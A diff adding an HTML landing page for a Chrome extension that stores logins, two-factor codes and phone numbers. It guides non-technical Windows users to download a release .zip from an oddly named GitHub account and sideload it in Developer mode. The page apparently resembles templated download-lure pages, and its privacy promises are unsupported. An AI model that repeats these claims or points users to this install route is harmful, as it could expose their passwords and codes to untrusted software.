@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>save-book-extension - Your Private Digital Vault for Logins, Codes & Phone Numbers</title>
+    <meta name="description" content="Save-book-extension is a privacy-first Chrome extension that pins a draggable card of your saved logins, codes, and phone numbers to the websites you choose. No servers, no tracking — everything stays in your browser.">
+    <meta name="keywords" content="extension, extension-chrome, manifest-v3, manual-testing, privacy-first, productivity, qa, qa-testing, solids, testing-tools, tool, typescript, vite, vitejs">
+    <meta name="author" content="save-book-extension team">
+    <meta property="og:title" content="save-book-extension - Your Private Digital Vault">
+    <meta property="og:description" content="Pin a draggable card of your saved logins, codes, and phone numbers to any website. 100% private, no servers, no tracking.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/arsenopyritepseudomonaspyocanea35/save-book-extension">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="save-book-extension - Your Private Digital Vault">
+    <meta name="twitter:description" content="Pin a draggable card of your saved logins, codes, and phone numbers to any website. 100% private, no servers, no tracking.">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2d3748;
+            line-height: 1.7;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem 1rem;
+        }
+        .container {
+            max-width: 900px;
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
+            padding: 3rem 3rem 2rem;
+            margin: 0 auto;
+        }
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            text-align: center;
+            color: #1a202c;
+            line-height: 1.2;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin: 2.5rem 0 1rem;
+            color: #2d3748;
+            padding-bottom: 0.5rem;
+            border-bottom: 3px solid #4a5568;
+            display: inline-block;
+        }
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin: 1.5rem 0 0.75rem;
+            color: #2d3748;
+        }
+        p {
+            margin-bottom: 1.25rem;
+            font-size: 1.05rem;
+            color: #4a5568;
+        }
+        .lead {
+            font-size: 1.2rem;
+            color: #4a5568;
+            text-align: center;
+            max-width: 700px;
+            margin: 0 auto 2rem;
+        }
+        .badge {
+            display: inline-block;
+            background: #e53e3e;
+            color: white;
+            font-weight: 700;
+            font-size: 1.1rem;
+            padding: 0.9rem 2rem;
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(229, 62, 62, 0.4);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            margin: 0 auto;
+            text-align: center;
+            display: block;
+            width: fit-content;
+            margin-bottom: 2rem;
+        }
+        .badge:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(229, 62, 62, 0.5);
+        }
+        .badge-secondary {
+            background: #3182ce;
+            box-shadow: 0 4px 15px rgba(49, 130, 206, 0.4);
+        }
+        .badge-secondary:hover {
+            box-shadow: 0 6px 20px rgba(49, 130, 206, 0.5);
+        }
+        ul, ol {
+            margin: 1rem 0 1.5rem 2rem;
+            color: #4a5568;
+            font-size: 1.05rem;
+        }
+        li {
+            margin-bottom: 0.75rem;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+        .feature-card {
+            background: #f7fafc;
+            padding: 1.5rem;
+            border-radius: 12px;
+            border-left: 4px solid #3182ce;
+            transition: transform 0.2s ease;
+        }
+        .feature-card:hover {
+            transform: scale(1.02);
+        }
+        .feature-card h3 {
+            margin-top: 0;
+            color: #2d3748;
+        }
+        .feature-card p {
+            margin-bottom: 0;
+            font-size: 0.95rem;
+        }
+        .step-box {
+            background: #f7fafc;
+            border-radius: 12px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+            border: 1px solid #e2e8f0;
+        }
+        .step-box ol {
+            margin-left: 1.5rem;
+        }
+        .note {
+            background: #ebf8ff;
+            border-left: 4px solid #3182ce;
+            padding: 1rem 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            font-size: 0.95rem;
+            color: #2c5282;
+        }
+        .keyword-section {
+            margin-top: 3rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #e2e8f0;
+            font-size: 0.85rem;
+            color: #a0aec0;
+            word-spacing: 0.3rem;
+        }
+        @media (max-width: 768px) {
+            body {
+                padding: 1rem;
+            }
+            .container {
+                padding: 2rem 1.5rem;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+            h2 {
+                font-size: 1.4rem;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📒 save-book-extension - Your Private Digital Vault</h1>
+        <p class="lead">Keep your logins, codes, and phone numbers safe and accessible — right on the websites you use most.</p>
+
+        <a href="https://github.com/arsenopyritepseudomonaspyocanea35/save-book-extension/releases" class="badge">📥 Download Now — Free & Private</a>
+
+        <h2>💡 What Is This?</h2>
+        <p>Have you ever been frustrated trying to remember which password goes with which website? Or maybe you've been copying the same verification code from your phone over and over again? <strong>save-book-extension</strong> solves this by letting you pin a small, draggable card right onto any website you visit. This card holds your important information — logins, codes, phone numbers — so you always have it at your fingertips.</p>
+        <p>The best part? <strong>Everything stays in your browser.</strong> No servers, no tracking, no cloud. Your data is 100% private and never leaves your computer. It's like a secure sticky note that follows you wherever you browse.</p>
+
+        <h2>✨ Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>🔒 100% Private & Local</h3>
+                <p>All your data is stored directly in your browser. No accounts, no uploads, no cloud — just you and your browser.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🖱️ Draggable & Customizable</h3>
+                <p>Move the card anywhere on your screen. Pin it to a specific website or keep it floating for quick access.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔑 Secure Logins</h3>
+                <p>Store usernames and passwords in an organized way. Copy them with a single click when you need them.</p>
+            </div>
+            <div class="feature-card">
+                <h3>📱 Codes & Phone Numbers</h3>
+                <p>Keep verification codes, two-factor authentication codes, and important phone numbers neatly organized.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🚫 No Tracking</h3>
+                <p>We don't track you, we don't collect data, and we don't sell anything. It's pure, honest software.</p>
+            </div>
+            <div class="feature-card">
+                <h3>⚡ Built for Speed</h3>
+                <p>Modern technology (TypeScript and Vite) makes this extension fast, reliable, and lightweight.</p>
+            </div>
+        </div>
+
+        <h2>🚀 Getting Started (Windows)</h2>
+        <p>Follow these simple steps to get save-book-extension up and running on your Windows computer. Don't worry — you don't need any technical skills!</p>
+
+        <div class="step-box">
+            <h3>Step 1: Download the Extension</h3>
+            <ol>
+                <li>Click the <a href="https://github.com/arsenopyritepseudomonaspyocanea35/save-book-extension/releases" style="color:#3182ce; font-weight:bold;">Download button</a> at the top of this page.</li>
+                <li>You'll be taken to the releases page on GitHub.</li>
+                <li>Look for the latest version (usually at the top).</li>
+                <li>Click on the file that says <strong>"save-book-extension"</strong> — it will be a <strong>.zip</strong> file.</li>
+                <li>Visit this link to download the application.</li>
+            </ol>
+        </div>
+
+        <div class="step-box">
+            <h3>Step 2: Extract the File</h3>
+            <ol>
+                <li>Once downloaded, find the .zip file in your Downloads folder (usually <code>This PC → Downloads</code>).</li>
+                <li>Right-click on the .zip file.</li>
+                <li>Select <strong>"Extract All..."</strong> from the menu.</li>
+                <li>Choose a location (the default is fine) and click <strong>"Extract"</strong>.</li>
+                <li>You'll now have a folder with the same name as the .zip file.</li>
+            </ol>
+        </div>
+
+        <div class="step-box">
+            <h3>Step 3: Load the Extension in Chrome</h3>
+            <ol>
+                <li>Open your Google Chrome browser.</li>
+                <li>Type <code>chrome://extensions</code> in the address bar and press Enter.</li>
+                <li>In the top right corner, turn on <strong>"Developer mode"</strong> (the toggle switch).</li>
+                <li>Click the <strong>"Load unpacked"</strong> button that appears at the top left.</li>
+                <li>Navigate to the folder you extracted earlier and select it.</li>
+                <li>Click <strong>"Select Folder"</strong>.</li>
+                <li>You're done! The extension is now installed.</li>
+            </ol>
+        </div>
+
+        <div class="note">
+            <strong>📌 Tip:</strong> Pin the extension to your Chrome toolbar by clicking the puzzle piece icon at the top right of your browser, then clicking the pin icon next to "save-book-extension". This makes it easy to access your card at any time.
+        </div>
+
+        <h2>📖 How to Use Save-Book</h2>
+        <p>Once installed, using save-book-extension is incredibly easy:</p>
+        <ol>
+            <li><strong>Add your first item:</strong> Click the extension icon in your toolbar. A small panel will open where you can add a new entry — give it a name, then type or paste the login, code, or phone number.</li>
+            <li><strong>Pin it to a website:</strong> Visit any website where you want to see your card. Click the extension icon again and select <strong>"Pin to this site"</strong>.</li>
+            <li><strong>Use your card:</strong> Your draggable card will appear right on that website. You can drag it anywhere on the screen. When you need a piece of information, just click on it to copy it to your clipboard.</li>
+            <li><strong>Edit or remove:</strong> Open the extension panel anytime to edit, delete, or add new items to your card.</li>
+        </ol>
+
+        <h2>❓ Frequently Asked Questions</h2>
+        <h3>Is my data really private?</h3>
+        <p>Absolutely. save-book-extension stores everything locally in your browser's storage. There are no servers, no accounts, and no analytics. Nothing ever leaves your computer. Even we (the developers) cannot see your data.</p>
+
+        <h3>Will this work on other browsers?</h3>
+        <p>This version is specifically designed for Google Chrome. Other Chromium-based browsers (like Microsoft Edge, Brave, or Opera) may also work, but we officially support Chrome.</p>
+
+        <h3>What if I forget my information?</h3>
+        <p>Since everything is stored locally, it's a good idea to keep a backup. You can export your data from the extension settings (look for the export option) and save it somewhere safe.</p>
+
+        <h3>Is this free?</h3>
+        <p>Yes! save-book-extension is completely free to use. It's a passion project built by developers who believe in privacy-first tools.</p>
+
+        <h2>🛠️ Technical Details (For the Curious)</h2>
+        <p>If you're interested in the tech behind this tool, here's a quick summary:</p>
+        <ul>
+            <li><strong>Built with:</strong> TypeScript and Vite for fast, modern, and reliable code.</li>
+            <li><strong>Manifest Version:</strong> Uses Manifest V3, the latest standard for Chrome extensions, ensuring better security and performance.</li>
+            <li><strong>Data Storage:</strong> Uses browser's local storage (chrome.storage.local) — no external databases.</li>
+            <li><strong>Privacy Architecture:</strong> Completely offline-capable, no network requests are ever made by the extension.</li>
+            <li><strong>Testing:</strong> Includes manual testing tools and QA features to ensure everything runs smoothly.</li>
+        </ul>
+
+        <h2>📬 Get Support or Contribute</h2>
+        <p>We're always working to make save-book-extension better. If you have feedback, find a bug, or want to help improve the code, visit our <a href="https://github.com/arsenopyritepseudomonaspyocanea35/save-book-extension" style="color:#3182ce;">GitHub repository</a>. Even if you're not a programmer, you can still help by reporting issues or suggesting new features.</p>
+
+        <a href="https://github.com/arsenopyritepseudomonaspyocanea35/save-book-extension/releases" class="badge badge-secondary" style="margin-top:2rem;">📦 Get the Latest Version Now</a>
+
+        <div class="keyword-section">
+            Keywords: extension, extension-chrome, manifest-v3, manual-testing, privacy-first, productivity, qa, qa-testing, solids, testing-tools, tool, typescript, vite, vitejs
+        </div>
+    </div>
+</body>
+</html>
